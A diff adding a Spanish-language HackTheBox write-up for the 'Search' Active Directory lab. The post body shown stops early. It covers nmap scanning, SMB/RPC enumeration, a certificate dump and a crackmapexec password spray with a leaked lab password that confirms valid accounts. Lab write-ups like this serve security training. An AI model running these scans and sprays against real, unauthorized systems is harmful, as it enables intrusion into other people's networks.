@@ -1,0 +1,1710 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Search (hard) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Search (hard)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-12T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Search (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-12T00:00:00-06:00","datePublished":"2024-04-12T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Search (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Search (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-12T00:00:00-06:00" itemprop="datePublished">
+        Apr 12, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/03cea0fc2ebc50151c0dfa9e375e3ded.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar resolviendo la maquina Search de la plataforma de Hack The Box que es un entorno de Directorio Activo donde vamos a estar enumerando por los protocolos SMB, RPC, además de estar haciendo un Kerberoast attack y obtener un XLSX que contiene data muy importante como usuarios y credenciales que usaremos para obtener certificados y conectarnos a un Windows PowerShell Web Access donde gracias a bloodhound sabremos la vía para escalar privilegios le vamos a cambiar la contraseña a un usuario que pertenece dentro del grupo Domain Admins y nos conectaremos con wmiexec para ver la ultima flag.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th>Uso</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td>Solo queremos ver puertos abiertos.</td>
+    </tr>
+    <tr>
+      <td>-sS</td>
+      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
+    </tr>
+    <tr>
+      <td>–min-rate 5000</td>
+      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
+    </tr>
+    <tr>
+      <td>-vvv</td>
+      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
+    </tr>
+    <tr>
+      <td>-n</td>
+      <td>Para que no aplique resolución DNS.</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td>Para exportar la salida en formato Greppable.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.229.57 <span class="nt">-oG</span> allPorts
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:28 CST
+Initiating SYN Stealth Scan at 14:28
+Scanning 10.129.229.57 <span class="o">[</span>65535 ports]
+Discovered open port 139/tcp on 10.129.229.57
+Discovered open port 135/tcp on 10.129.229.57
+Discovered open port 80/tcp on 10.129.229.57
+Discovered open port 53/tcp on 10.129.229.57
+Discovered open port 445/tcp on 10.129.229.57
+Discovered open port 443/tcp on 10.129.229.57
+Discovered open port 9389/tcp on 10.129.229.57
+Discovered open port 49724/tcp on 10.129.229.57
+Discovered open port 3269/tcp on 10.129.229.57
+Discovered open port 8172/tcp on 10.129.229.57
+Discovered open port 49699/tcp on 10.129.229.57
+Discovered open port 3268/tcp on 10.129.229.57
+Discovered open port 49692/tcp on 10.129.229.57
+Discovered open port 464/tcp on 10.129.229.57
+Discovered open port 389/tcp on 10.129.229.57
+Increasing send delay <span class="k">for </span>10.129.229.57 from 0 to 5 due to 12 out of 38 dropped probes since last increase.
+Discovered open port 88/tcp on 10.129.229.57
+Increasing send delay <span class="k">for </span>10.129.229.57 from 5 to 10 due to 11 out of 20 dropped probes since last increase.
+Completed SYN Stealth Scan at 14:29, 67.08s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.129.229.57
+Host is up, received user-set <span class="o">(</span>0.44s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2024-04-07 14:28:44 CST <span class="k">for </span>67s
+Not shown: 65519 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+443/tcp   open  https            syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+8172/tcp  open  unknown          syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49692/tcp open  unknown          syn-ack ttl 127
+49699/tcp open  unknown          syn-ack ttl 127
+49724/tcp open  unknown          syn-ack ttl 127
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
+extractPorts <span class="o">()</span> <span class="o">{</span>
+	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
+	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
+	<span class="nb">cat </span>extractPorts.tmp
+	<span class="nb">rm </span>extractPorts.tmp
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>La ejecutamos y nos copea los puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.229.57
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th>Uso</th>
+      <th>Párametro</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
+      <td>-sCV</td>
+    </tr>
+    <tr>
+      <td>Que no lo exporte a un archivo normal.</td>
+      <td>-oN</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724 10.129.229.57 <span class="nt">-oN</span> targeted
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:48 CST
+Nmap scan report <span class="k">for </span>10.129.229.57
+Host is up <span class="o">(</span>0.49s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-07 20:49:07Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
+|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+| http-methods:
+|_  Potentially risky methods: TRACE
+| tls-alpn:
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
+| tls-alpn:
+|_  http/1.1
+|_http-title: Site doesn<span class="s1">'t have a title.
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after:  2030-04-05T09:05:25
+|_http-server-header: Microsoft-IIS/10.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49692/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2024-04-07T20:50:03
+|_  start_date: N/A
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Vemos el puerto 80 abierto vamos a ver las tecnologías que se están empleando.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">youremail</span><span class="vi">@search</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Search</span> <span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span> <span class="no">Just</span> <span class="no">Testing</span> <span class="no">IIS</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que tenemos un posible subdominio existente en la maquina que se llama <code class="language-plaintext highlighter-rouge">search.htb</code> así que vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> en caso de que se este aplicando <code class="language-plaintext highlighter-rouge">Virtual Hosting</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.229.57 search.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.229.57 search.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí vemos el mismo nombre si usamos <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.229.57
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tenemos muchos puertos abiertos pero como estamos ante un Entorno de Directorio Activo podemos comenzar enumerando el servicio <code class="language-plaintext highlighter-rouge">RPC</code> para ver si podemos enumerar usuarios del dominio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code> por que no disponemos de credenciales.</p>
+  </li>
+  <li>
+    <p>No podemos enumerar.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.129.229.57 <span class="nt">-N</span>
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>No encontramos nada por que necesitamos de disponer de credenciales validas pero también tenemos el puerto 443 abierto podemos inspeccionar el certificado por casi siempre encontramos información valiosa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap openssl s_client <span class="nt">-connect</span> 10.129.229.57:443
+CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
+Can<span class="s1">'t use SSL_get_servername
+depth=0 CN = research.search.htb, CN = research
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = research.search.htb, CN = research
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = research.search.htb, CN = research
+verify return:1
+---
+Certificate chain
+ 0 s:CN = research.search.htb, CN = research
+   i:DC = htb, DC = search, CN = search-RESEARCH-CA
+   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Aug 11 08:13:35 2020 GMT; NotAfter: Aug  9 08:13:35 2030 GMT
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
+ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
+MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
+MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
+DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
+AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
+OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
+VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
+nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
+BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
+UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
+JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
+VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
+MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
+A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
+gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
+aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
+Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
+b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
+dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
+ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
+Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
+JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
+FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
+JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
+7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
+7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
+-----END CERTIFICATE-----
+subject=CN = research.search.htb, CN = research
+issuer=DC = htb, DC = search, CN = search-RESEARCH-CA
+---
+No client certificate CA names sent
+Peer signing digest: SHA256
+Peer signature type: RSA
+Server Temp Key: ECDH, secp384r1, 384 bits
+---
+SSL handshake has read 1907 bytes and written 581 bytes
+Verification error: unable to verify the first certificate
+---
+New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 2048 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: DD43000058B89B34DEC8D6F721AFE9AE4CD04A82C34216BE763E4ADCE3E1E92F
+    Session-ID-ctx:
+    Master-Key: 9DC677241F4C42AEFDA506C7334AD059E4B16040E59E07F6E820712A1E3A7B821A639EF56E7574ACD0B809159AECB46D
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    Start Time: 1712523918
+    Timeout   : 7200 (sec)
+    Verify return code: 21 (unable to verify the first certificate)
+    Extended master secret: yes
+---
+</span></code></pre></div></div>
+
+<ul>
+  <li>Encontramos un subdominio a si que vamos agregarlo al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.129.229.57 search.htb research.search.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Pero si vemos las paginas webs vemos que las 3 son los mismo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/1.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/2.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/3.png" />
+</p>
+
+<h2 id="hopesharp">hope.sharp</h2>
+
+<ul>
+  <li>Si vemos en las imágenes que nos muestran en la web hay una contraseña y un usuario básicamente un <code class="language-plaintext highlighter-rouge">Information Leakage</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/4.png" />
+</p>
+
+<ul>
+  <li>Para validar si es un usuario valido vamos a hacer varios ejemplos del nombre de usuario por que no sabemos como es que lo representa a si que vamos a crear un <code class="language-plaintext highlighter-rouge">.txt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
+hopesharp
+h.sharp
+hope.s
+h.sharp
+hope.sharp
+H.Sharp
+Hope.Sharp
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos hacerlo con <code class="language-plaintext highlighter-rouge">kerbrute</code> o con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--continue-on-success</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>opesharp:IsolationIsKey? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>ope.s:IsolationIsKey? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\H</span>ope.Sharp:IsolationIsKey?
+</code></pre></div></div>
+
+<ul>
+  <li>Básicamente es el mismo usuario <code class="language-plaintext highlighter-rouge">Hope.Sharp</code> y <code class="language-plaintext highlighter-rouge">hope.sharp</code>.</li>
+</ul>
+
